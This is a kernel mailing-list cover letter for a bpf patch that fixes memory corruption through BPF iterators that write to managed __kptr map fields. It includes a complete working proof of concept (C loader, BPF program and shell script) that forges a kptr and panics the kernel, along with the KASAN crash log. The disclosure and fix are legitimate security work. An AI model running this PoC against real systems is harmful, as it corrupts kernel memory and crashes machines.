Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.174
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792478142;
	b=151OKtlIAE9d3/cQcoiHtaDF+sv/WXRvA68mhnD0hixk1sriJpA+byZK/B8DDcbYRNym
	 x3oMbOGAo04knkak9vwPUX70fJQMlhP7njFkEtRApOsNDaVievj9lA1Wm/JxOeUNmb69q
	 ZW+U2R7bAlPjb9EiDfID2umy690nFUZr0PiIxFkhO7eNWWoABpeql161b6Xo7eij6bO6u
	 UFqWHdAdocD/DOIAt2s1U5bmA9vgsGpWhVcYiSIeKXPwMTfpDMbFQI0oIj4m237+n8Mpg
	 1EMykEtNROWD61X4KbL+hyWRVZqohklqSZqUXRM7Y7v/Ra9tYe7AlcVshBVAXsWCB7w==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792478142;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=hScbwC7f6JxQU1uTM/N380ixrv7RTXvS+GqXcD4H2nY=;
	b=dorecGTicOWPQn3fnZ+eAu+c8KyGTPSQD6mQlo1FwpmVJzE2zCojUwleCcwgXyxG7jof
	 1fRCl5myRdpNV7eNV9uuekJKdo4b9pGU98/aYpwIqRR0vye7eo3MdxTM35jGTXWofvLKt
	 e52mm9+Ng66SQJWGCtDJTPt48cnBx7UxiC/E9Fc9KZKIfuitiKToknFYPMm3FADIN4YfU
	 p5ZDy57BGJVN0b69LUt5qbi6NAQjDcbLxDAAR48Hti9pqpLP+zS4TaWrLoBcRhm9bxHL8
	 0aodgYky1+NDdz+P/uYpzDvUbOLRMzEKDQetWkBMbzLO40cl8BhXkYQpK7E+AFdIKNg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=jBkXPQwk;
	arc=none smtp.remote-ip=74.125.82.174
Received: from mail-dy1-f174.google.com (mail-dy1-f174.google.com [74.125.82.174])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 593D0606A327
	for <llvm@lists.linux.dev>; Tue, 20 Oct 2026 06:35:42 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 593D0606A327
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=jBkXPQwk
Received: by mail-dy1-f174.google.com with SMTP id 5a478bee46e88-353804b591eso5504661eec.0
        for <llvm@lists.linux.dev>; Mon, 19 Oct 2026 23:35:42 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792478141; x=1793082941; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=hScbwC7f6JxQU1uTM/N380ixrv7RTXvS+GqXcD4H2nY=;
        b=jBkXPQwkml0s0Zm0GGO4/8yEzWh70+DZj9RExqapcCfNZkcGni4FgOfkbRZ1qAvW6b
         Vufl9SSjnanBBzy9Z9qkvyFdpfphRBgJeCpTsqCKSicmgc48eo3lzCuPK3E47exfBTtf
         4m3pMmldsRB0IEYLfn/XifmfTL1zZgrtzldYbuXrHt+lWfZ1F2WGl+24tAr/A1y/RkbD
         gzGwHxEN35+b5aBPJOspuKMnS6VZU+bMkgxkYYfegLAg2q+1Ife7px0pFIryHSXCVs/M
         EvegxcPRxOoLBlfmqDTZzCJ8H/2SUWw9CMtZPYKu1QRiDxANT+aw8gZZIWJlfNfLFcUE
         D+1A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792478141; x=1793082941;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=hScbwC7f6JxQU1uTM/N380ixrv7RTXvS+GqXcD4H2nY=;
        b=FneXa7tVcyIlHU1Vshu/pEGj0pTts4HYgeUdDwpaaddYtSz3L8fY0J7fb3FMXZ8XfG
         JbZRWeP++6R3xao+uef1oI69bPPxRrhq7/lKiIpEMz7W4Jedt4dKFH/2mSdCS1C/RKXi
         01aRFeFf/Kl4avjB0qyOGsbjS1eGR+WEYn2riZSSVJFYhzyf8Z4VDDQu10FUZjgjcsp7
         M/FPWRKDJic5Xpk1+FyiDmeavu10eaQz9082S6ZLzpvYbiOIXC0EM7fsTqSrvWj0lsK9
         QllBrdvEO/pNypJfucFZRWO9aBCTcjRUGc74SRENP2RcOsxwGYIf0DYErldcNmCHwlX2
         rvgg==
X-Forwarded-Encrypted: i=1; AKwUvBwodXP9GEtDGLpRVXrR76i4aj67/XWk5nUb4NnWzUW/LJ32v1OJZidBAt5lAtHPl06kYP5P@lists.linux.dev
X-Gm-Message-State: AFq9FYJK4LgYJ5GWQWs281rSuZLnXrega93Jz+bfiD0S4HDrlbx/zWnm
	JMGumGKnHFQosOElq7KIotWel/xZMT89v4lsnyObJyMNgRPcPlWnMvKydp3fkghJk+rt
X-Gm-Gg: AYBFou09Tgb73PWxjiPHsjKY0ey3z6PlMxzAc6BAZz91G9bSmRzaB0Z4M5iGm6q5PIq
	vwT0QBDv2q9KuKpBwfI7CORcRoAyv46Tz/d4x1jGG6tbJxGs8ntQuFnBRm6/cp1YGWGS7Fejsxk
	khYnbjm5/ofS7Wlu5DVNIp/Vs/phu5qVnMVklpASRaX27Zy2PR/wkskdpu05a5SoNJe2XZmSfy0
	B7Ni3xFm5rT5H/4T3hg+Y7msTgkI7eFvLaLYc2MIpD5TwJyhFIINHNa7400f0EzP3v+vdZC2LZP
	Mwo44m+W6DHsKoIFJSx2hhEyc/oPzLuCR1to+kr2p83PfpOKrn1BTVpBYaNyQBtmgm5Ye5Xn1T1
	IWf/RMhnop+UHsSGC7XwZRshwRvliC3DhD6V8IUpBU4FJ8l174bKsgflDSQpS2mChMZGhcNIZvL
	vvETBH1vpiHfcgvqy/ysNhs2sY1/ihvJof83nHnQ6TqzCKITR/gd1MirezIl4xEwcfP0XgEDjf
X-Received: by 2002:a05:693c:6312:b0:353:7f17:4358 with SMTP id 5a478bee46e88-361a1c4888dmr15597108eec.24.1792478141028;
        Mon, 19 Oct 2026 23:35:41 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-36632d8b273sm2618192eec.15.2026.10.19.23.35.34
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 19 Oct 2026 23:35:40 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: ameryhung@gmail.com,
	bpf@vger.kernel.org,
	netdev@vger.kernel.org,
	llvm@lists.linux.dev
Cc: ast@kernel.org,
	daniel@iogearbox.net,
	andrii@kernel.org,
	eddyz87@gmail.com,
	memxor@gmail.com,
	martin.lau@linux.dev,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	ihor.solodrai@linux.dev,
	john.fastabend@gmail.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	nathan@kernel.org,
	ndesaulniers@google.com,
	morbo@google.com,
	justinstitt@google.com,
	zhilinz@nebusec.ai,
	menglong8.dong@gmail.com,
	bestswngs@gmail.com,
	mattbobrowski@google.com,
	vega@nebusec.ai,
	sashiko-bot@kernel.org
Subject: [PATCH bpf v2 0/1] bpf: reject raw iteration over managed map fields
Date: Tue, 20 Oct 2026 14:35:23 +0800
Message-ID: <cover.1792217106.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: llvm@lists.linux.dev
List-Id: <llvm.lists.linux.dev>
List-Post: <mailto:llvm@lists.linux.dev>
List-Help: <mailto:llvm+help@lists.linux.dev>
List-Subscribe: <mailto:llvm+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:llvm+unsubscribe@lists.linux.dev>
List-Owner: <mailto:llvm+owner@lists.linux.dev>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/core/bpf_sk_storage.c. A root
user with the capabilities required for tracing BPF programs and socket
storage maps can trigger memory corruption through BPF iterators.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The bpf_sk_storage_map iterator exposes each storage value as a writable
PTR_TO_BUF. Its attach validation bounds the program's maximum access by
map->value_size, but does not account for BTF-managed fields in the map
value. A BPF program can therefore access an __kptr field as raw memory,
bypassing verifier ownership checks and bpf_kptr_xchg(). Deleting the
storage element then passes the corrupted pointer to bpf_obj_free_fields().

The bpf_map_elem iterator exposes map values as writable PTR_TO_BUF memory
as well. Its attach validation also checks only the maximum access against
value_size, allowing raw access to BTF-managed fields in map values.

The initial validation also leaves a bpf_link_update() gap: the iterator
link replaces its program without checking the replacement's access range
against the map held by the link.

The fix allows access to the ordinary value prefix before the first managed
field for both iterator targets. It also validates the replacement program
against the attached map. Selftests cover allowed prefix access, rejected
managed-field reads and writes, and rejected link updates that introduce
managed-field access.

Reproducer:

    ./poc.sh

The supplied prebuilt poc.bpf.o is used by the script. It requires bpftool,
libbpf, and Python 3 in the guest. We ran it as root in a 2 vCPU, 2 GB x86
QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    #include <bpf/bpf.h>
    #include <bpf/libbpf.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <linux/bpf.h>
    #include <netinet/in.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/resource.h>
    #include <sys/socket.h>
    #include <unistd.h>

    struct storage_init {
    	__u64 tag;
    	__u64 ignored_kptr_bytes;
    };

    static void die(const char *what)
    {
    	fprintf(stderr, "%s: %s\n", what, strerror(errno));
    	exit(1);
    }

    static void die_libbpf(const char *what, int err)
    {
    	errno = -err;
    	die(what);
    }

    static void raise_memlock(void)
    {
    	struct rlimit lim = {
    		.rlim_cur = RLIM_INFINITY,
    		.rlim_max = RLIM_INFINITY,
    	};

    	if (setrlimit(RLIMIT_MEMLOCK, &lim) && errno != EPERM)
    		die("setrlimit(RLIMIT_MEMLOCK)");
    }

    static int run_iter(struct bpf_program *prog, int map_fd)
    {
    	DECLARE_LIBBPF_OPTS(bpf_iter_attach_opts, opts);
    	union bpf_iter_link_info linfo;
    	struct bpf_link *link;
    	char buf[64];
    	int iter_fd;
    	int len;

    	memset(&linfo, 0, sizeof(linfo));
    	linfo.map.map_fd = map_fd;
    	opts.link_info = &linfo;
    	opts.link_info_len = sizeof(linfo);

    	link = bpf_program__attach_iter(prog, &opts);
    	if (libbpf_get_error(link))
    		return libbpf_get_error(link);

    	iter_fd = bpf_iter_create(bpf_link__fd(link));
    	if (iter_fd < 0) {
    		int err = -errno;

    		bpf_link__destroy(link);
    		return err;
    	}

    	for (;;) {
    		len = read(iter_fd, buf, sizeof(buf));
    		if (len == 0)
    			break;
    		if (len < 0) {
    			int err = -errno;

    			close(iter_fd);
    			bpf_link__destroy(link);
    			return err;
    		}
    	}

    	close(iter_fd);
    	bpf_link__destroy(link);
    	return 0;
    }

    int main(void)
    {
    	struct storage_init init = {
    		.tag = 0x1337,
    	};
    	struct bpf_program *prog;
    	struct bpf_object *obj;
    	int map_fd;
    	int sock_fd;
    	int err;

    	raise_memlock();
    	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
    	libbpf_set_print(NULL);

    	obj = bpf_object__open_file("./poc.bpf.o", NULL);
    	if (libbpf_get_error(obj))
    		die_libbpf("bpf_object__open_file", libbpf_get_error(obj));

    	err = bpf_object__load(obj);
    	if (err)
    		die_libbpf("bpf_object__load", err);

    	map_fd = bpf_object__find_map_fd_by_name(obj, "sk_stg_map");
    	if (map_fd < 0)
    		die_libbpf("bpf_object__find_map_fd_by_name", map_fd);

    	prog = bpf_object__find_program_by_name(obj, "forge_bpf_sk_storage_kptr");
    	if (!prog) {
    		errno = ENOENT;
    		die("bpf_object__find_program_by_name");
    	}

    	sock_fd = socket(AF_INET6, SOCK_STREAM, 0);
    	if (sock_fd < 0)
    		die("socket(AF_INET6, SOCK_STREAM)");

    	err = bpf_map_update_elem(map_fd, &sock_fd, &init, BPF_NOEXIST);
    	if (err)
    		die("bpf_map_update_elem(sk_storage)");

    	err = run_iter(prog, map_fd);
    	if (err)
    		die_libbpf("run_iter", err);

    	fprintf(stderr, "[*] forged kptr in sk_storage value, deleting element now\n");
    	fflush(stderr);

    	err = bpf_map_delete_elem(map_fd, &sock_fd);
    	if (err)
    		die("bpf_map_delete_elem(sk_storage)");

    	fprintf(stderr, "[!] delete unexpectedly returned without crashing\n");
    	close(sock_fd);
    	bpf_object__close(obj);
    	return 0;
    }

------END poc.c--------

------BEGIN poc.bpf.c------

    #include "vmlinux.h"
    #include <bpf/bpf_helpers.h>
    #include <bpf/bpf_tracing.h>

    char LICENSE[] SEC("license") = "GPL";

    struct local_obj {
    	__u64 marker;
    };

    /* Force LLVM to emit full BTF for local_obj instead of a forward decl. */
    struct local_obj *btf_anchor;

    struct storage_val {
    	__u64 tag;
    	struct local_obj __kptr *ptr;
    };

    struct {
    	__uint(type, BPF_MAP_TYPE_SK_STORAGE);
    	__uint(map_flags, BPF_F_NO_PREALLOC);
    	__type(key, int);
    	__type(value, struct storage_val);
    } sk_stg_map SEC(".maps");

    SEC("iter/bpf_sk_storage_map")
    int forge_bpf_sk_storage_kptr(struct bpf_iter__bpf_sk_storage_map *ctx)
    {
    	struct storage_val *val = ctx->value;
    	volatile __u64 *raw_kptr;

    	if (!ctx->sk || !val)
    		return 0;

    	if (val->tag != 0x1337)
    		return 0;

    	raw_kptr = (volatile __u64 *)&val->ptr;
    	*raw_kptr = 0x1000;
    	return 0;
    }

------END poc.bpf.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    if [ ! -f ./poc.bpf.o ]; then
    	if ! command -v clang >/dev/null 2>&1; then
    		echo "missing ./poc.bpf.o and clang is unavailable" >&2
    		exit 1
    	fi
    	clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -I. -I./include -c poc.bpf.c -o poc.bpf.o
    fi

    gcc -O2 -g -Wall -o poc poc.c -lbpf -lelf -lz
    exec ./poc

------END poc.sh--------

----BEGIN crash log----

[  565.939149][T10631] Oops: general protection fault, probably for non-canonical address 0xdffffc00000001ff: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  565.940317][T10631] KASAN: null-ptr-deref in range [0x0000000000000ff8-0x0000000000000fff]
[  565.940900][T10631] CPU: 2 UID: 0 PID: 10631 Comm: poc Not tainted 6.12.95 #2
[  565.941419][T10631] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  565.942280][T10631] RIP: 0010:bpf_mem_free_rcu+0x2e/0x1d0
[  565.942721][T10631] Code: 48 85 f6 0f 84 55 01 00 00 48 b8 00 00 00 00 00 fc ff df 41 55 41 54 49 89 f4 55 48 89 fd 48 8d 7e f8 53 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 4f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b
[  565.943975][T10631] RSP: 0018:ffffc90013dbfae8 EFLAGS: 00010016
[  565.944492][T10631] RAX: dffffc0000000000 RBX: ffff88807deaf038 RCX: 1ffff110219809c0
[  565.944999][T10631] RDX: 00000000000001ff RSI: 0000000000001000 RDI: 0000000000000ff8
[  565.945495][T10631] RBP: ffffffff99d58fa0 R08: ffffffff81a67790 R09: ffffed102275f88e
[  565.945984][T10631] R10: 0000000000001000 R11: 0000000000000001 R12: 0000000000001000
[  565.946493][T10631] R13: 0000000000000000 R14: ffff88807deaf020 R15: dffffc0000000000
[  565.946986][T10631] FS:  00007fdedf88a740(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  565.947557][T10631] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  565.947979][T10631] CR2: 00007fdedfc07000 CR3: 000000007ebbe000 CR4: 0000000000750ef0
[  565.948485][T10631] PKRU: 55555554
[  565.948711][T10631] Call Trace:
[  565.949346][T10631]  <TASK>
[  565.949540][T10631]  bpf_obj_free_fields+0x38e/0x490
[  565.949882][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.950270][T10631]  bpf_selem_free+0x46/0x110
[  565.950566][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.950917][T10631]  bpf_selem_unlink_storage_nolock.constprop.0+0x25d/0x860
[  565.951374][T10631]  bpf_selem_unlink_storage+0x132/0x2e0
[  565.951726][T10631]  bpf_fd_sk_storage_delete_elem+0x118/0x180
[  565.952135][T10631]  ? __sys_bpf+0x23cf/0x4210
[  565.952429][T10631]  ? __pfx_bpf_fd_sk_storage_delete_elem+0x10/0x10
[  565.952839][T10631]  ? lock_acquire+0x2f/0xb0
[  565.953170][T10631]  ? __sys_bpf+0x23cf/0x4210
[  565.953466][T10631]  __sys_bpf+0x2440/0x4210
[  565.953752][T10631]  ? __pfx___sys_bpf+0x10/0x10
[  565.954070][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.954421][T10631]  ? vfs_write+0x9ff/0xf30
[  565.954728][T10631]  ? __pfx_vfs_write+0x10/0x10
[  565.955064][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.955435][T10631]  ? ksys_write+0x17c/0x1d0
[  565.955722][T10631]  ? __pfx_ksys_write+0x10/0x10
[  565.956036][T10631]  __x64_sys_bpf+0x78/0xc0
[  565.956329][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.956684][T10631]  ? lockdep_hardirqs_on+0x7b/0x110
[  565.957025][T10631]  do_syscall_64+0xc7/0x270
[  565.957334][T10631]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  565.957715][T10631] RIP: 0033:0x7fdedfaa57b9
[  565.958002][T10631] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
[  565.959226][T10631] RSP: 002b:00007ffd07695e78 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
[  565.959757][T10631] RAX: ffffffffffffffda RBX: 0000000000000009 RCX: 00007fdedfaa57b9
[  565.960253][T10631] RDX: 0000000000000020 RSI: 00007ffd07695e80 RDI: 0000000000000003
[  565.960741][T10631] RBP: 000055adbfb7c2a0 R08: 0000000000000000 R09: 0000000000000004
[  565.961234][T10631] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffd07695f80
[  565.961720][T10631] R13: 0000000000000004 R14: 000055adbfb7d810 R15: 00007ffd07695f3c
[  565.962235][T10631]  </TASK>
[  565.962430][T10631] Modules linked in:
[  565.962693][T10631] ---[ end trace 0000000000000000 ]---
[  565.963034][T10631] RIP: 0010:bpf_mem_free_rcu+0x2e/0x1d0
[  565.963397][T10631] Code: 48 85 f6 0f 84 55 01 00 00 48 b8 00 00 00 00 00 fc ff df 41 55 41 54 49 89 f4 55 48 89 fd 48 8d 7e f8 53 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 4f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b
[  565.964598][T10631] RSP: 0018:ffffc90013dbfae8 EFLAGS: 00010016
[  565.964982][T10631] RAX: dffffc0000000000 RBX: ffff88807deaf038 RCX: 1ffff110219809c0
[  565.965489][T10631] RDX: 00000000000001ff RSI: 0000000000001000 RDI: 0000000000000ff8
[  565.965978][T10631] RBP: ffffffff99d58fa0 R08: ffffffff81a67790 R09: ffffed102275f88e
[  565.966479][T10631] R10: 0000000000001000 R11: 0000000000000001 R12: 0000000000001000
[  565.966979][T10631] R13: 0000000000000000 R14: ffff88807deaf020 R15: dffffc0000000000
[  565.967488][T10631] FS:  00007fdedf88a740(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  565.968045][T10631] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  565.968454][T10631] CR2: 00007fdedfc07000 CR3: 000000007ebbe000 CR4: 0000000000750ef0
[  565.968945][T10631] PKRU: 55555554
[  565.969183][T10631] Kernel panic - not syncing: Fatal exception
[  565.969732][T10631] Kernel Offset: disabled
[  565.970010][T10631] Rebooting in 86400 seconds..

-----END crash log-----

Zhiling Zou (1):
  bpf: reject raw iteration over managed map fields

 include/linux/bpf.h                           |   3 +
 kernel/bpf/bpf_iter.c                         |   9 +
 kernel/bpf/map_iter.c                         |  56 ++++--
 net/core/bpf_sk_storage.c                     |  34 +++-
 .../selftests/bpf/prog_tests/bpf_iter.c       | 187 ++++++++++++++++++
 .../bpf/progs/bpf_iter_bpf_sk_storage_map.c   | 113 +++++++++++
 6 files changed, 377 insertions(+), 25 deletions(-)

-- 
2.55.0

